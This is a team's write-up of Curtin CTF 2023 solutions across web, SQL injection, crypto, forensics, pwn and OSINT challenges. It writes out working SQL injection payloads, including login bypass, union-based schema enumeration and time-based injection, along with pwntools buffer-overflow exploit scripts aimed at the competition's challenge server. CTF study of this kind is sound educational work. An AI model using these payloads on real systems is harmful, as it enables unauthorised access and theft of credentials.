

# WRITEUP Curtin CTF 2023
![2](https://github.com/plnsgr/os1ris/blob/main/CURTIN%20CTF/images/image002.jpg?raw=true)

Welcome to the Curtin CTF 2023 writeup challenge (Team scap3G04T) ! You will find writeups and solutions for various challenges presented during the competition. Feel free to explore the challenges and learn from the writeups provided here.

## Navigate

- [General Web](#general-web)
- [SQLi](#sqli)
- [Crypto](#crypto)
- [Forensics](#forensics)
- [Pwn & Reverse Eng](#pwn--reverse-eng)
- [OSINT](#osint)
- [General](#general)
- [Hall Of Fame](#hall-Of-fame)

---

## General Web
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Content Missing – I

(Author: 4jai)

![3](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image003.png)

This challenge is continuity for Content Missing – II, but I don’t know why it’s name I. So anyway, we found the suspicious directory in the headphone photo named /homeChall. When we try to access the webpage, it just says the flag for this challenge.

![4](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image004.png)

But when accessing using curl, there are hidden directory in the response.

![5](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image005.png)

So, we try to access the hidden directory and get the flag.

![6](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image006.png)

```
Flag: CURTIN_CTF{C0NGR4TUL4T10N5_0N_Y0UR_H0M3C0M1NG}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Content Missing – II

(Author: 4jai)

![7](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image007.png)

These challenges ask us to find missing content in the webpage, so we can analyze the source code to find any suspicious code here. We found something unusual at the fourth photo.

![8](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image008.png)

Based on the image, it should be in /static/Content.png but the code shows that we cannot find the image. So, we try to look in the /static and there are Content.png with the flag.

![9](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image009.png)

```
Flag: CURTIN_CTF{N33D_F0R_B3TT3R_C0D3_R3V13W}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### No Crawl

(Author: 4jai)

![10](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image010.png)

This challenge was straight forward as it just give us a website. The challenge name was the clue for our investigation, and it was the crawler. Google crawler will crawl to website and there are one file that use to navigate the crawler called robots.txt.

![11](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image011.png)

There are hidden directory here and we got the flag from the directory.

![12](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image012.png)

```
Flag: CURTIN_CTF{B0T530T5BOTSB0T555555BOTS}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Join the Union

(Author: 4jai)

![13](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image013.png)

In this challenge we were given the webpage to register.

![14](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image014.png)

After we tried to register, we also intercept the request using burp and we found interesting directory.

![15](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image015.png)

We can try to access the directory, but it asks me WHO AM I. Whut. After some experiments, we can see that there is cookie value that may be useful. I first didn’t know what to do with that value but after some experiment with the request, we got the flag.

![16](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image016.png)

```
Flag: CURTIN_CTF{Th15_Fl4g_15_h15hly_c0nf1d3nt14l}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Hackerman

(Author: 4jai & OS1RIS)

![17](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image017.png)

This webpage is straight forward as we need to login using Username Hackerman and unknown password. 
Looking through source code, the password may have some criteria to be follow.

![18](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image018.png)

This JavaScript show that the password needs to be 10 characters in length and including number and . symbol. So base on the clue given the password are the pi value. Because in the pie there is a dot and fit the authors quote has the clue "Circle".

![19](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image019.png)

![20](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image020.png)
```
Password: 3.14159265
```
![21](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image021.png)

```
Flag: CURTIN_CTF{RUNN1NG_!N_C1Rcl3s_4ll_th3_t1M3}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Obscure Communication

(Author: OS1RIS)

![22](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image022.png)

Google-fu all available information then narrow down to more specific info/clue. It can be based on question name, author, category, related past ctf, etc . "Obscure" means something is not clear or easily understood. In this context, it might refer to a technique or method used to make the ETag value less predictable or harder to guess. Etag can setup the range such as Start and End range. With the buffer, it will read the content inside.

![23](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image023.png)

```
Flag: CURTIN_CTF{Th3_D3v1l15_1NTH3_D3T41L5}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
---

## SQLi

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Try to login

(Author: 4jai)

![24](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image024.png)

The webpage ask us to login, by using simple payload ‘OR 1=1-- - in username and password, we got the flag.

```
‘OR 1=1-- -
```

![25](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image025.png)

```
Flag: CURTIN_CTF{5H0pT1m3}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Try logging in... again

(Author: 4jai)

![26](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image026.png)

The second webpage also ask the same questions, but now the payload did not work. We try to search another working payload and found the payload that can be use:

```
admin') or ('1'='1
```

![27](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image027.png)

```
Flag: CURTIN_CTF{welc0m3aG@1n}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Database Discovery Quest

(Author: 4jai)

![28](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image028.png)

The challenge asks us to find the database name. So, we find the number of column first, then use union query adding with database() function to get the flag.

```
' union select 1,2,3,4,5-- -
```

```
' union select 1,2,3,database(),5-- -
```

![29](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image029.png)

```
Flag: CURTIN_CTF{d8_@_Ba$3}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Table Name Treasure Hunt

(Author: 4jai)

![30](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image030.png)

Next task, we need to find the table name. We use the sqli payload to get the flag.

```
' union select 1,2,3,table_name,5 from information_schema.tables where table_schema=database()-- -
```

![31](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image031.png)

```
Flag: CURTIN_CTF{#1y!n#2Y@ng}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Fiver Fever

(Author: 4jai)

![32](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image032.png)

For this challenge, we need to find the user hash password in the database, using sqlmap, we can dump all the user passwords.

![33](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image033.png)

```
Flag: CURTIN_CTF{ab57c73efc0563ea1a25df5fb6c7590a}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Slow Down...

(Author: 4jai)

![34](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image034.png)

This challenges ask us to make the sql injection to the server, but this time we need to do time based sql injection. We use the time based sqli payload and get the flag.

```
'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
```

![35](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image035.png)

```
Flag: CURTIN_CTF{5l0wpOk3}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Unveiling the Dark Wizard's Secrets

(Author: 4jai)

![36](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image036.png)

The final sql challenge ask us to provide hash password for Voldemort, but there are two of them, and the clue said his name start with tom. Now we know which is the right flag.

![33](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image033.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
---

## Crypto
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Cryptography Warm Up – 1

(Author: OS1RIS)

![37](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image037.png)

![38](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image038.jpg)

The image show Caesar. That’s mean its cesar cypher!

![39](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image039.png)



```
Flag: CURTIN_CTF{welcome friends}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Rock Solid Algorithm

(Author: OS1RIS)

![40](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image040.png)

![41](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image041.png)

```
from Crypto.Util.number import long_to_bytes, bytes_to_long

def calculate_l(p, q, e, n, c):
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)  # Calculate the modular multiplicative inverse of e modulo phi(n)

    # Divide c by pow(7, 67, n) modulo n to remove the additional multiplication
    c_divided = (c * pow(pow(7, 67, n), -1, n)) % n

    # Decrypt the modified ciphertext using the private exponent d
    plaintext_num = pow(c_divided, d, n)
    plaintext_bytes = long_to_bytes(plaintext_num)  # Convert the decrypted number to bytes
    return plaintext_bytes

p = 10075074928110055320983299450955832147285581720686937452885136490075482010478329285574909031817766443094543754307130937113436894210662611186804910350673739
q = 9886521529465159110858223684531245586341305742202655520627984802997767481968177534026821220827361390740860408054552957084006774174916828299460710141588913
n = 99607445187734702107672050713219055972353811018649673149729254351994084224071878146019333582468778929779986007724763345905018859972007667888748490798685901727009897608934867544049494299343511477402233809426496145541725402417288332912803260127889996200961568136031432691565575110457301560346058909033522655707
c = 39846410813151558582155351307536396275470154197815746409248003690219981108430982531412398847576131983987228821922170894316744469976162149284764673750057503209953057000646539975526352712986657979423992853266193509637393750747906929220101138988581175284078696544686419718769387285821068512198694788165401230753744242809745342454406960609358464495278149729768163763997
e = 65537

# Use the calculate_l function to find the plaintext l
plaintext_l = calculate_l(p, q, e, n, c)

# Print the plaintext
print(plaintext_l.decode('utf-8'))
```

Calculate the phi(ϕ) and private exponent ‘d’ .c_divided operations on the ciphertext ("c") for decryption. It involves multiplying "c" by a value obtained by raising 7 to the 67th power, taking the modular inverse, and then performing modulo "n."

![42](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image042.png)

```
CURTIN_CTF{n0_stepov3r5_0r_b0dy_f31n75_just_m47h}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### IV League Aesthetics

(Author: OS1RIS)

![43](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image043.png)

![44](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image044.png)

Challenge_file.txt:

```
7Of04mXIUNGpHQy8TRjAh6zfFh933JZoXWJsMEfCicgXD4CZzrfKq72V3sgU66UI1He/ffRW78NUHZF+7J6pP0fNCYRiPgxnRqixoryI4xOLAEZ4wB83W0Wwq76WxnsP
```

This code will reads a base64-encoded ciphertext from 'challenge_file.txt,' decrypts it using AES in CBC mode, performs PKCS#7 padding removal, rearranges the bytes based on the 'b_p' function, and then decrypts the final flag. Finally, it prints the decoded flag as a UTF-8 string.

```
from Crypto.Cipher import AES
import base64

def pkcs7_unpad(data):
    padding = data[-1]
    return data[:-padding]
#0,1,2,4
def b_p(data):
    l = [4,1,3,2,0,7,6,5,10,9,8,11,15,14,13,12,19,18,17,16,23,22,21,20,27,26,25,24,31,30,29,28]
    y = bytearray(32)
    for i, index in enumerate(l):
        if i < len(data):
            y[index] = data[i]
    return bytes(y)

with open('challenge_file.txt', 'r') as file:
    ctn = base64.b64decode(file.read())

iv = b'\x00' * 16
cn = AES.new(iv, AES.MODE_CBC, iv)

# Decrypt the ciphertext and remove padding
k = cn.decrypt(ctn)
fp = pkcs7_unpad(k)

# Initialize the AES cipher in ECB mode
c = AES.new(iv, AES.MODE_ECB)


flag = c.decrypt(fp)
# Revert the byte order
flag = b_p(flag)
print("Decoded Flag:")
print(flag.decode('utf-8'))
```

*Note : seems like I can’t fix the CURITN to CURTIN (Skill Issue)

![45](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image045.png)

```
Flag: CURTIN_CTF{wh3r3_1s_7h3_k3y?}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Fun with Primes – 1

(Author: OS1RIS)

![46](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image046.png)

I apologize for not being able to decode the prime number. Unfortunately, I could only decipher the text as a Vigenere cipher and couldn't find a prime number reference.

![47](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image047.png)

```
Flag: CURTIN_CTF{naturalcomposite}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### The Curse of Genius

(Author: 4jai)

![48](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image048.png)

The curse of genius gives us 3 file that are cipher text, hint image and a person image. Base on the hint the cipher is vignere, we search the image and found the name of the person and it be Oppenheimer.

```
Flag: CURTIN_CTF{Oppenheimer}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Cryptography Warm Up – 2

(Author: 4jai)

![49](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image049.png)

This challenge is straight forward as the hint is obvious, the cipher is rail fence cipher. So, we use cyberchef to decode the text.

![50](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image050.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Listening Skills

(Author: 4jai)

![51](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image051.png)

The challenge given us audio that are morse code. So, we can use online decoder to decode the audio.

![52](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image052.png)

```
Flag: CURTIN_CTF{TELECOMMUNICATION765}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Curvy Vibes

(Author: 4jai)

![53](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image053.png)

The question gives us python code:

![54](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image054.png)

We reverse the code using chatgpt and blackbox to get the solve script and get the flag

![55](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image055.png)

![56](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image056.png)

```
Flag: CURTIN_CTF{8989y98798_7578687}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Operational Duties

(Author: 4jai)

![57](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image057.png)

This challenge gives encryption algorithm that use 2 secret key.

![58](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image058.png)

By understanding the code by asking chatgpt and blackbox, we created the solver script.

![59](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image059.png)

![60](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image060.png)

```
CURTIN_CTF{just_XOR_r1gh7?}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### The Gambler’s Secret

(Author: 4jai)

![61](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image061.png)

The challenge give us the AES algorithm

![62](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image062.png)

By using chatgpt and blackbox, we try to understand the code, and create the solver. Honestly, I don’t understand much about AES, but with AI explaining the code, I try to repair the code and solve the challenges.

![63](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image063.png)

![64](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image064.png)

```
Flag: CURTIN_CTF{b377er_ch3ck_y0ur_5ubgr0up}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
---

## Forensics
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Hide and Seek

(Author: 4jai)

The challenge gives us image to analyze, we use steghide but it ask for password. I try to use stegcracker and found the password and got the flag. 
![65](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image065.png)

```
Flag: CURTIN_CTF{H1D3_4W4Y}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Let's Analyze

(Author: 4jai)

This challenge asks us to login to Mr. John Doe account using the nc. But how can we get the creds, ahhh there are pcap file given. By using filter, we got the credentials and successfully login to get the flag.

![66](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image066.png)

![67](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image067.png)

```
Flag: CURTIN_CTF{51L3NT_L1573NN3R}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Secret File

(Author: 4jai)

The challenge gives us Secret.txt file, but when analyze the file it seems the file are not txt. So, we use file command to check what the file are, and it was zip. So, change the extension of the file and unzip it to get the flag.

![68](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image068.png)

![69](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image069.png)

```
Flag: CURTIN_CTF{4LW4Y5_IN5P3CT_TH3_F1L3_TYP3}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Nice Image!!!

(Author: 4jai)

This challenges also same as nice image as I just strings the file to get the flag.

![70](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image070.png)


```
Flag: CTF{H3X_ED1T0RS_$R3_SO_COOL}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Nice Image - 2 !!!

(Author: 4jai)

This forensic challenge is the easiest as the file given has flag in the file itself, so using linux, we can strings the file to get the flag.

![71](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image071.png)

```
Flag: CURTIN_CTF{K4L1_15_7H3_B357}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Soundless

(Author: Dinze)

![72](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image072.png)

Open the voice using Audacity, then open Effect > amplify and then by using google voice to detect the song

![73](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image073.png)

```
Flag: CURTIN_CTF{Paparazzi_Lady_Gaga}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Party All Night – 2

(Author: Dinze & OS1RIS)

![74](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image074.jpg)

Use Exiftools to get “boththebags” image description and then by usings steghide and applying the password “boththebags” we will get another picture which is this

![75](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image075.png)

![76](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image076.png)

![77](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image077.png)

By focusing the image I still don’t have any clue so I searched google for “top best backpack in new delhi” and found a brand name that could possibly be.

![78](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image078.png)

![79](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image079.png)

Theres other 2 bag in the picture but I seems to recognize the small bags as I have one too. 

![80](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image080.png)

![81](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image081.jpg)

Tried my luck and got it

```
Flag: CURTIN_CTF{Skybags_Quechua}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Weird Text

(Author: 4jai)

The challenge was quite simple as it just gives us long strings to be decode, base on the looks of the strings it was base64. We decode it multiple times and got the flag.

![82](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image082.png)

```
CURTIN_CTF{T00_MUCH_B45364_15_T00_MUCH_T00_H4NDL3}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Hoax

(Author: 4jai & OS1RIS)

The challenge gives us credit card image to find the bank name. We analyze the image and find another card image, so we reverse search the card image and got the real image and find the bank name.

![83](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image083.png)

![84](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image084.jpg)

```
Flag: CURTIN_CTF{Mastercard_HDFC_Bank}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
---

## Pwn & Reverse Eng
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Intro to Buffer Overflow

(Author: OS1RIS)

![85](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image085.png)

A simple spamming 'a' in the buffer may lead to the discovery of a vulnerability, potentially exposing sensitive data or triggering unintended program behavior. In these cases it will pop the flag.

![86](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image086.png)

```
Flag: CURTIN_CTF{Y0UR_F1R5T_0V3RFL0W}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Let The Random Games Begin 1

(Author: OS1RIS)

![87](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image087.png)

When running the code, notice the code Number doesn’t change. We craft simple python to send the Number that we gather from tested nc.

![88](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image088.png)

```
from pwn import *
p=remote('3.26.44.175',3337)
p.sendline("1804289383")
p.sendline("846930886")
p.sendline("1681692777")
p.sendline("1714636915")
p.sendline("1957747793")
p.interactive()
```

![89](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image089.png)

```
FLAG: CURTIN_CTF{N0_S33D_N0_R4ND0M}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Don't go overboard

(Author: OS1RIS)

![90](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image090.png)

![91](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image091.png)

While reading the code. Noticed that the condition to display the flag is flags=’5’, and secured=’0’.
But for now we just need to find the Buffer. Sure we can use math which is buffer [48] – [16] = [32]. But we can try using gdb-peda to find the buffer offset.

![92](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image092.png)

![93](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image093.png)

Running the code inside radare2. Paste the pattern and then lookup for RBP 0x61414

![94](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image094.png)

Now we can confirm that the buffer offset is at 32.

![95](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image095.png)

For the code, the number will buffer for 30 times and 31,32 places will send the “0” and “5”
Try running it.

```
from pwn import *
context.bits=64
p=remote('3.26.44.175',3334)
overwrite=(b"0"*30)+b"05"
p.sendline(overwrite)
p.interactive()
```

![96](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image096.png)

```
Flag: CURTIN_CTF{T@RG3TT3D_0V3RF10W}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Don't go overboard 2

(Author: OS1RIS)

![97](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image097.png)

![98](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image098.png)

It shows the input and the showflag value what if we overflow same like previous question?

![99](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image099.png)

Same as previous question. But the condition is now 0xf && 0x405 . now we can send the directly payload.

```
echo 'AAAAAAAAAAAAAAAAAAAAB\x00\x00\x00\x05\x04\x00\x00\xf' | nc 3.26.44.175 3335
```

![100](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image100.png)

I try to run directly from my WSL. But I don’t get the output. Now try on different machine. Then we get the flag.

![101](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image101.png)

```
Flag: CURTIN_CTF{P4YL04D_OV3RF10W}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Let The Random Games Begin 2

(Author: OS1RIS)

![102](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image102.png)

![103](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image103.png)

These times the value is random

![104](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image104.png)

Craft my simple python , the value that we get from ‘Begin 1’
Waiting seed to be 1804289383 .Then using the number from first Don’t go overboard 1

```
import socket

addr = '3.26.44.175'
port = 3338

def ncThisPlis(s):
    def recv_until(s, read):
        data = b''
        while read.encode('utf-8') not in data:
            chunk = s.recv(1024)
            if not chunk:
                break
            data += chunk
        return data.decode('utf-8').strip()

    while True:
        line = recv_until(s, "The random number is 1804289383")
        print(line)

        s.sendall(b"846930886\n")
        s.sendall(b"1681692777\n")
        s.sendall(b"1714636915\n")
        s.sendall(b"1957747793\n")

        congrats = recv_until(s, "Congratulations you got it right!")
        print(congrats)
        if "Congratulations you got it right!" in congrats:
            print("Yay or Nay?")
            return

if __name__ == "__main__":
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.connect((addr, port))
                ncThisPlis(s)
            except Exception as e:
                print(f"Error Bang, Pinjam seratus: {e}")
```

![105](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image105.png)

Now if the seed is correct. We get the flag

```
Flag: CURTIN_CTF{7H3_F1RS7_P53UD0}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Classic Buffer Overflow

(Author: OS1RIS)

![106](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image106.png)

Open the challenge as radare2 (Can use anything gdb also fine as long as it have address)

![107](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image107.png)

Some interesting function ‘sym.getFlag’ it could be a flag function.

![108](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image108.png)

Looking at the getFlag function the address 0x004011e9 will locate the flag.txt.
Now we get the address. Proceed with calling the getFlag.

![109](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image109.png)

```
from pwn import *
context.bits=64
e = ELF('./challenge.bin')
#p=process(e.path)
p=remote('3.26.44.175',3336)
overwrite=b"A"*40
addr=0x004011d6 #address from getFlag
payload=overwrite
payload+=p64(addr)
p.sendline(payload)
p.interactive()
```

![110](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image110.png)

```
Flag: CURTIN_CTF{B4S1C_0V3RF10W}
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Let The Random Games Begin 3

(Author: OS1RIS)

![111](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image111.png)

Same as Random 2. But the seed doesn’t show. We just need to force the number first. Then manually enter the value.

![112](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image112.png)

```
Flag: CURTIN_CTF{I75_4LL_R4ND0M}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
---

## OSINT
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Party All Night 1

(Author: Dinze)

By reverse search the image given, we will get an identical image with the one given and “Palm Green Hotel and Resort” seems to be the one with the picture. Then we just need to find the restaurant and the bar name which is highlighted below.

![113](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image113.png)

```
Flag: CURTIN_CTF{Green_Chilli_Savannah}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Party All Night 3

(Author: Dinze)

By reverse image search the three bag from Party all Night – 2, we can get it from the review comment. Proceed to apply the date and website name.

![114](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image114.png)

```
Flag: CURTIN_CTF{26_Feb_2022_makemytrip.com}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Party All Night 4

(Author: OS1RIS)

It’s a challenge that connect to Party Night 1. Needed to find the nearest attraction place. After countless try and Countless view

![115](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image115.png)
![116](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image116.png)

